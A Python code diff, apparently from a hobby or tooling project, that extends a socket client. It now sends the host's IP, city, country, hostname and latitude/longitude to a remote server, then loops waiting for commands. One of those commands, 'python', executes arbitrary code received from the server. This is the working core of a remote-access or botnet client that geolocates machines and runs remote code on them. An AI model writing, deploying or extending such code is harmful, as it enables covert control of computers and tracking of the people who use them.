@@ -11,7 +11,9 @@ def get_ip_info():
         'ip': data.get('ip'),
         'city': data.get('city'),
         'country': data.get('country'),
-        'hostname': socket.gethostname()
+        'hostname': socket.gethostname(),
+        'lat': data.get('loc').split(',')[0],
+        'lon': data.get('loc').split(',')[1]
     }
 
 def run_code(code):
@@ -35,16 +37,35 @@ command = {
         'ip': ip_info['ip'],
         'city': ip_info['city'],
         'country': ip_info['country'],
-        'hostname': ip_info['hostname']
+        'hostname': ip_info['hostname'],
+        'lat': ip_info['lat'],
+        'lon': ip_info['lon']
     }
 }
 print(command)
 json_command = json.dumps(command)
 client_socket.sendall(json_command.encode())
 
-import time
-time.sleep(2000)
-
-# đóng kết nối
-    
-client_socket.close()
+while True:
+    try:
+        data = client_socket.recv(1024).decode()
+        json_data = json.loads(data)
+        print(json_data)
+        if json_data['cmd'] == 'ls_clients':
+            print('List clients:', json_data['result'])
+        
+        if json_data['cmd'] == 'python':
+            code = json_data['code']
+            run_code(code)
+            
+        
+        if json_data['cmd'] == 'ping':
+            client_socket.sendall(json.dumps({
+                'cmd': 'pong'
+            }).encode())
+        
+        if json_data['cmd'] == 'exit':
+            break
+    except Exception as e:
+        print(e)
+        continue
